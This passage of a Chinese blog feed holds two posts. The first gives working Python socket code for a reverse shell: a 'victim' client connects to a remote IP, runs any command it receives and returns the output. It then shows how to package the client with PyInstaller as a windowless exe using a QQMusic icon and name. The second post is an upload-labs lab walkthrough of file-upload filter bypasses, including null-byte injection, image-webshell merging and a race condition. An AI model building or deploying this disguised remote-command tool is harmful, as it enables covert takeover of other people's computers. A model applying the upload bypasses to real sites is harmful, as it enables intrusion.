标准错误输出</span></span><br><span class="line"><span class="comment"># 正确输出</span></span><br><span class="line">res = obj.stdout.read()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line"><span class="built_in">print</span>(res.decode(<span class="string">&#x27;gbk&#x27;</span>))  <span class="comment">#subprocess使用当前系统默认编码，得到结果为bytes类型，在windows下需要用gbk解码</span></span><br><span class="line"><span class="comment"># 错误输出</span></span><br><span class="line">res_err = obj.stderr.read()</span><br><span class="line"><span class="comment"># 打印</span></span><br><span class="line"><span class="built_in">print</span>(res_err)</span><br></pre></td></tr></table></figure><p>在原来的通信基础上，新增接收命令，并执行命令，然后发送命令执行的结果，解决粘包：<br>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行命令函数&quot;&quot;&quot;</span></span><br><span class="line">    obj = subprocess.Popen(command.decode(<span class="string">&quot;utf-8&quot;</span>), shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                           stdin=subprocess.PIPE)</span><br><span class="line">    stdout_res = obj.stdout.read() + obj.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> stdout_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;111.111.111.11&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 新增解包接收命令</span></span><br><span class="line">            cmd = recv_data(client)  <span class="comment"># 接收对面传来的数据</span></span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">b&quot;q&quot;</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 调用subprocess中的方法去执行这个系统命令</span></span><br><span class="line">            res = exec_cmd(cmd)</span><br><span class="line">            send_data(client, res)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    server.listen(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;等待链接.....&quot;</span>)</span><br><span class="line">    conn, c_addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">f&#x27;shell&gt;&#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cmd:<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">                send_data(conn, cmd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            send_data(conn,cmd)</span><br><span class="line">            <span class="comment"># 接收客户端发来的内容</span></span><br><span class="line">            data = recv_data(conn)</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;gbk&quot;</span>).strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br><span class="line">    server.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="四、py打包exe"><a href="#四、py打包exe" class="headerlink" title="四、py打包exe"></a>四、py打包exe</h1><p>安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><p>打包命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w demo.py</span><br><span class="line"></span><br><span class="line">-F  打包成一个exe文件 </span><br><span class="line">-w 不显示黑窗口 (默认会显示) , 也可以用 --noconsole 参数 </span><br><span class="line">-i   指定图标 , .ico文件 或者是exe文件 , 会自动提取exe文件的图标</span><br><span class="line">-n  指定打包好的文件名</span><br></pre></td></tr></table></figure><p>打包好的程序在dist目录下，示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w <span class="number">05.</span>受害者.py -i <span class="string">&quot;C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe&quot;</span> -n qqmusic</span><br><span class="line"></span><br><span class="line">pyinstaller -F -w <span class="number">10.</span>客户端(受害者).py -i <span class="string">&quot;C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe&quot;</span> -n main</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意：py不支持交叉编译。&#x3D;&#x3D;<br>可视化打包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip3 install auto-py-to-exe</span><br><span class="line"></span><br><span class="line">auto-py-to-exe</span><br><span class="line"></span><br><span class="line">本质还是pyinstaller</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Socket </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场</title>
      <link href="/2022/03/25/upload_labs_act/"/>
      <url>/2022/03/25/upload_labs_act/</url>
      
        <content type="html"><![CDATA[<h1 id="一、折腾环境"><a href="#一、折腾环境" class="headerlink" title="一、折腾环境"></a>一、折腾环境</h1><ul><li>虚拟机win10环境</li><li>phpstudy2018</li><li>安装了upload-labs</li></ul><h1 id="二、Pass-01"><a href="#二、Pass-01" class="headerlink" title="二、Pass-01"></a>二、Pass-01</h1><h2 id="1、写好我们的测试文件"><a href="#1、写好我们的测试文件" class="headerlink" title="1、写好我们的测试文件"></a>1、写好我们的测试文件</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5e4799ee2f784212862f76b73fb0aa06.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d58b6e3ccedc49fd8c8e860d3370efce.png" alt="在这里插入图片描述"></p><h2 id="2、将php后缀名改为jpg"><a href="#2、将php后缀名改为jpg" class="headerlink" title="2、将php后缀名改为jpg"></a>2、将php后缀名改为jpg</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c25517188bbe457187589c64316376e9.png" alt="在这里插入图片描述"><br>##3、选择文件后开启抓包，点提交，burp抓到包<br><img src="http://120.48.107.243:9090/blog/2023/04/03/830d0638dad6480fbcf2ca9359ac0840.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/90dc8370cc8142aaa4c91bf2d4ed2090.png" alt="在这里插入图片描述"></p><h2 id="4、将包中sh-jpg改为sh-php，发送包"><a href="#4、将包中sh-jpg改为sh-php，发送包" class="headerlink" title="4、将包中sh.jpg改为sh.php，发送包"></a>4、将包中sh.jpg改为sh.php，发送包</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3d5bbab607754007a25d8021ae3c36aa.png" alt="在这里插入图片描述"><br>##5、右键图片打开图片网址，则可以看到成功<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bf82312f43c14deebe08a59351fcdcee.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/e05d1200f9844646a2f398c6218eccd4.png" alt="在这里插入图片描述"></p><h1 id="三、Pass-02"><a href="#三、Pass-02" class="headerlink" title="三、Pass-02"></a>三、Pass-02</h1><h2 id="1、首先01关的方法02同样适用。"><a href="#1、首先01关的方法02同样适用。" class="headerlink" title="1、首先01关的方法02同样适用。"></a>1、首先01关的方法02同样适用。</h2><h2 id="2、直接选择php文件，开启抓包，提交抓到包"><a href="#2、直接选择php文件，开启抓包，提交抓到包" class="headerlink" title="2、直接选择php文件，开启抓包，提交抓到包"></a>2、直接选择php文件，开启抓包，提交抓到包</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/43804932686b40ca8791eb10ca9d3d5e.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d9a47f099130434b9d59d671818ba909.png" alt="在这里插入图片描述"></p><h2 id="3、将content-type值改为-image-x2F-jpeg，发送"><a href="#3、将content-type值改为-image-x2F-jpeg，发送" class="headerlink" title="3、将content-type值改为 image&#x2F;jpeg，发送"></a>3、将content-type值改为 image&#x2F;jpeg，发送</h2><h2 id="4、右键图片在新标签打开图片，即可看到成功"><a href="#4、右键图片在新标签打开图片，即可看到成功" class="headerlink" title="4、右键图片在新标签打开图片，即可看到成功"></a>4、右键图片在新标签打开图片，即可看到成功</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ff26d789eb9f492189635f9711eefd95.png" alt="在这里插入图片描述"></p><h1 id="四、Pass-03"><a href="#四、Pass-03" class="headerlink" title="四、Pass-03"></a>四、Pass-03</h1><h2 id="1、需要在httpd-conf中查找application-x2F-x-httpd-php，开启php3或其他。"><a href="#1、需要在httpd-conf中查找application-x2F-x-httpd-php，开启php3或其他。" class="headerlink" title="1、需要在httpd.conf中查找application&#x2F;x-httpd-php，开启php3或其他。"></a>1、需要在httpd.conf中查找application&#x2F;x-httpd-php，开启php3或其他。</h2><h2 id="2、选择sh-php文件，开启抓包，点提交，抓到包"><a href="#2、选择sh-php文件，开启抓包，点提交，抓到包" class="headerlink" title="2、选择sh.php文件，开启抓包，点提交，抓到包"></a>2、选择sh.php文件，开启抓包，点提交，抓到包</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/853ae930d7ec4ccaa45c85d5b759ff00.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/66aebf3a1b5442bcad2baba0f85ad482.png" alt="在这里插入图片描述"></p><h2 id="3、修改sh-php为sh-php3（其他也可以，具体请百度）"><a href="#3、修改sh-php为sh-php3（其他也可以，具体请百度）" class="headerlink" title="3、修改sh.php为sh.php3（其他也可以，具体请百度）"></a>3、修改sh.php为sh.php3（其他也可以，具体请百度）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/cf3237e6bd074241b9fbf37df6284e74.png" alt="在这里插入图片描述"></p><h2 id="4、发送包，关闭抓包，右键图片在新标签打开，即可看到成功。"><a href="#4、发送包，关闭抓包，右键图片在新标签打开，即可看到成功。" class="headerlink" title="4、发送包，关闭抓包，右键图片在新标签打开，即可看到成功。"></a>4、发送包，关闭抓包，右键图片在新标签打开，即可看到成功。</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/613078a065e84073be7244c2aed252a2.png" alt="在这里插入图片描述"><br>#五、Pass-04<br>##1、写一个名字为htaccess的文件，没有后缀名，上传，抓包<br><img src="http://120.48.107.243:9090/blog/2023/04/03/11f75a370c4b43af93f58361a8a528f3.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f40717521e264621917cd70c69b1f84b.png" alt="在这里插入图片描述"></p><h2 id="2、抓到包后将在名字前面加个"><a href="#2、抓到包后将在名字前面加个" class="headerlink" title="2、抓到包后将在名字前面加个."></a>2、抓到包后将在名字前面加个.</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b3071bbdca474acda379d05531501f5f.png" alt="在这里插入图片描述"><br>##3、发送，取消拦截，将sh.jpg上传，然后直接访问图片，即可发现成功<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ae778aaf75744e40ae287a6f02a52a62.png" alt="在这里插入图片描述"></p><h1 id="六、Pass-05"><a href="#六、Pass-05" class="headerlink" title="六、Pass-05"></a>六、Pass-05</h1><h2 id="1、选择sh-php，开启抓包，点击提交，抓包"><a href="#1、选择sh-php，开启抓包，点击提交，抓包" class="headerlink" title="1、选择sh.php，开启抓包，点击提交，抓包"></a>1、选择sh.php，开启抓包，点击提交，抓包</h2><h2 id="2、将包里的sh-php后面加上-发送。（-x3D-x3D-两个点里面有空格-x3D-x3D-）"><a href="#2、将包里的sh-php后面加上-发送。（-x3D-x3D-两个点里面有空格-x3D-x3D-）" class="headerlink" title="2、将包里的sh.php后面加上 . .    发送。（&#x3D;&#x3D;两个点里面有空格&#x3D;&#x3D;）"></a>2、将包里的sh.php后面加上 . .    发送。（&#x3D;&#x3D;两个点里面有空格&#x3D;&#x3D;）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/92f9922f5cba4dca88dfd86a5f3cf18a.png" alt="在这里插入图片描述"></p><h2 id="3、右键图片，在新建标签页打开，即可看到成功。"><a href="#3、右键图片，在新建标签页打开，即可看到成功。" class="headerlink" title="3、右键图片，在新建标签页打开，即可看到成功。"></a>3、右键图片，在新建标签页打开，即可看到成功。</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/88eee99d409c4602af1579830572a264.png" alt="在这里插入图片描述"></p><h1 id="七、Pass-06"><a href="#七、Pass-06" class="headerlink" title="七、Pass-06"></a>七、Pass-06</h1><h2 id="1、这一关把上一关的htaccess禁掉了"><a href="#1、这一关把上一关的htaccess禁掉了" class="headerlink" title="1、这一关把上一关的htaccess禁掉了"></a>1、这一关把上一关的htaccess禁掉了</h2><h2 id="2、选择文件sh-php，开启抓包，提交，抓到包"><a href="#2、选择文件sh-php，开启抓包，提交，抓到包" class="headerlink" title="2、选择文件sh.php，开启抓包，提交，抓到包"></a>2、选择文件sh.php，开启抓包，提交，抓到包</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7a42955d14574ee191b2f0177ea72aa8.png" alt="在这里插入图片描述"><br>##3、将sh.php改成sh.Php，发送<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3929c809079041e6bf84ceb9713a94e0.png" alt="在这里插入图片描述"><br>##4、右键图片在新标签页打开，即可看到成功<br><img src="http://120.48.107.243:9090/blog/2023/04/03/73acb8ce3d284f10afab129386e695c7.png" alt="在这里插入图片描述"><br>#八、Pass-07<br>##1、选择文件，开启抓包，点击提交，抓到包。<br>##2、将sh.php后面加一个空格，发送。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/756ef19b10104bcfa3fb7d77146a6061.png" alt="在这里插入图片描述"><br>##3、右键图片，在新标签页打开即可看到成功。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d1026d3cc52c4cb6953eb9365b6e4e4e.png" alt="在这里插入图片描述"><br>#九、Pass-08<br>##1、选择文件，开启抓包，点击提交，抓到包。<br>##2、将sh.php后面加一个. ，发送。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b6e54e48dde54656a4314fc28277202c.png" alt="在这里插入图片描述"></p><h2 id="3、右键图片从新标签页打开，即可看到成功。"><a href="#3、右键图片从新标签页打开，即可看到成功。" class="headerlink" title="3、右键图片从新标签页打开，即可看到成功。"></a>3、右键图片从新标签页打开，即可看到成功。</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c15b5938cbe34b75b355151089673d46.png" alt="在这里插入图片描述"><br>#十、Pass-09<br>##1、选择文件，开启抓包，提交文件，抓到包<br>##2、将包里的sh.php后面加::$DATA，发送<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7dd8d03df8b748fca0847bf15c32f7a7.png" alt="在这里插入图片描述"><br>##3、右键图片，从新标签页打开即可看到成功，记得把url里的::$DATA删掉，否则看不到。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f09066e91eb84a72b46c96426b0b7d9e.png" alt="在这里插入图片描述"><br>#十一、Pass-10<br>##1、选择文件sh.php，开启抓包，提交，抓到包，将包发送到重发器，将sh.php改为sh.phpp:.jpg<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6e57709430924ed39f21f8e8021d93e9-20230403142059849.png" alt="在这里插入图片描述"><br>##2、发送后将再改为sh.&gt;&gt;&gt;，发送，取消抓包。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ab0d69f787834734b3174226dfd4047b.png" alt="在这里插入图片描述"><br>##3、然后就可以直接访问了。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8d0fa505f2b5499c8d7d0a53bc19376b.png" alt="在这里插入图片描述"><br>#十二、Pass-11<br>##1、选择sh.php，开启抓包，提交，抓包。<br>##2、将sh.php改为sh.pphphp，发送。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8c8d5fd9c09d4f2692d0d439c90e8779.png" alt="在这里插入图片描述"><br>##3、右键图片，在新标签页打开，即可看到成功。<br>#十三、Pass-12<br>##1、这一关需要php版本&lt;5.3.4，而且magic_quotes_gpc&#x3D;off。<br>##2、提交sh.jpg，抓包，在头文件补全upload后面的，在sh.php结尾加上%00。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0016fb211d8543049f32b57dddc666f1.png" alt="在这里插入图片描述"><br>##3、直接访问upload&#x2F;sh.php即可。<br>#十四、Pass-13<br>##1、选择sh.jpg，提交，抓包，发送到重发器。<br>##2、找到&#x2F;upload&#x2F;把后面补全，&#x2F;upload&#x2F;sh.php%00<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e3c3be95e3c34e9ca76207846080a69c.png" alt="在这里插入图片描述"></p><h2 id="3、选中-00右键转换选择-URL-网址解码，发送"><a href="#3、选中-00右键转换选择-URL-网址解码，发送" class="headerlink" title="3、选中%00右键转换选择-URL-网址解码，发送"></a>3、选中%00右键转换选择-URL-网址解码，发送</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/948709bca9954133a8271002c424d977.png" alt="在这里插入图片描述"></p><h2 id="4、直接访问upload-x2F-sh-php即可发现成功"><a href="#4、直接访问upload-x2F-sh-php即可发现成功" class="headerlink" title="4、直接访问upload&#x2F;sh.php即可发现成功"></a>4、直接访问upload&#x2F;sh.php即可发现成功</h2><h1 id="十五、Pass-14"><a href="#十五、Pass-14" class="headerlink" title="十五、Pass-14"></a>十五、Pass-14</h1><h2 id="1、准备一张图片，不行的话多换几张，和sh-php放一块，使用命令合成一张新的图片。"><a href="#1、准备一张图片，不行的话多换几张，和sh-php放一块，使用命令合成一张新的图片。" class="headerlink" title="1、准备一张图片，不行的话多换几张，和sh.php放一块，使用命令合成一张新的图片。"></a>1、准备一张图片，不行的话多换几张，和sh.php放一块，使用命令合成一张新的图片。</h2><p>copy 1.gif&#x2F;b+123.php&#x2F;a she.jpg</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1884358b6fde4c71a8fdc3703cfa8f19.png" alt="在这里插入图片描述"></p><h2 id="2、选择文件，上传，然后右键文件包含漏洞"><a href="#2、选择文件，上传，然后右键文件包含漏洞" class="headerlink" title="2、选择文件，上传，然后右键文件包含漏洞"></a>2、选择文件，上传，然后右键文件包含漏洞</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/989a23fe51fa4db4ac9609dffca9af2d.png" alt="在这里插入图片描述"></p><h2 id="3、在hackbar中load一下地址，然后加上-file-x3D-upload-x2F-（上传上去的文件名）"><a href="#3、在hackbar中load一下地址，然后加上-file-x3D-upload-x2F-（上传上去的文件名）" class="headerlink" title="3、在hackbar中load一下地址，然后加上?file&#x3D;upload&#x2F;（上传上去的文件名）"></a>3、在hackbar中load一下地址，然后加上?file&#x3D;upload&#x2F;（上传上去的文件名）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/85d4655270ae407cb9b9d9145b9e0ef3.png" alt="在这里插入图片描述"><br>#十六、Pass-15<br>Pass-15和Pass-14一样。<br>#十七、Pass-16<br>Pass-16和Pass-14一样。<br>#十八、Pass-17<br>这里最好选择gif图片木马<br>可以使用制作好的gif（这里不提供）。<br>上传后，使用蚁剑即可连接成功。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8fa6720e2769439d87c49a62e9ab2933.png" alt="在这里插入图片描述"></p><h1 id="十九、Pass-18"><a href="#十九、Pass-18" class="headerlink" title="十九、Pass-18"></a>十九、Pass-18</h1><h2 id="1、选择sh-php，开启抓包，提交，抓到包。"><a href="#1、选择sh-php，开启抓包，提交，抓到包。" class="headerlink" title="1、选择sh.php，开启抓包，提交，抓到包。"></a>1、选择sh.php，开启抓包，提交，抓到包。</h2><h2 id="2、将之前写好的一句话木马换成"><a href="#2、将之前写好的一句话木马换成" class="headerlink" title="2、将之前写好的一句话木马换成"></a>2、将之前写好的一句话木马换成</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/77076239b7ff41db8f92a079f83b3e5a.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0eea40171359438f81ff473b56d04ce2.png" alt="在这里插入图片描述"><br>##3、发送到测试器，选择狙击手，不设置包，调整线程，选择没有负载，资源池中最大并发请求数大一些。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/aeb806114c8f419f8439aecdbe07a047.png" alt="在这里插入图片描述"></p><h2 id="4、使用python脚本文件去访问upload下时有时无的文件。"><a href="#4、使用python脚本文件去访问upload下时有时无的文件。" class="headerlink" title="4、使用python脚本文件去访问upload下时有时无的文件。"></a>4、使用python脚本文件去访问upload下时有时无的文件。</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5e3a047f41fc474da6e579472cbb10ec.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d81b4d9f6fd649419cee779a831b9a98.png" alt="在这里插入图片描述"><br>直到出现ok。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6c131bb192ee417c80542f8f40492cf5.png" alt="在这里插入图片描述"><br>就可以看到shell.php<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2cd7a40e21844ee29e978df5b49c2203.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/3c29734852d54636b5718f496f3f9819.png" alt="在这里插入图片描述"></p><h1 id="二十、Pass-19"><a href="#二十、Pass-19" class="headerlink" title="二十、Pass-19"></a>二十、Pass-19</h1><h2 id="1、选择sh-php，开启抓包，提交，抓到包。-1"><a href="#1、选择sh-php，开启抓包，提交，抓到包。-1" class="headerlink" title="1、选择sh.php，开启抓包，提交，抓到包。"></a>1、选择sh.php，开启抓包，提交，抓到包。</h2><h2 id="2、将之前写好的一句话木马换成-1"><a href="#2、将之前写好的一句话木马换成-1" class="headerlink" title="2、将之前写好的一句话木马换成"></a>2、将之前写好的一句话木马换成</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/77076239b7ff41db8f92a079f83b3e5a-20230403142203000.png" alt="在这里插入图片描述"></p><p><img 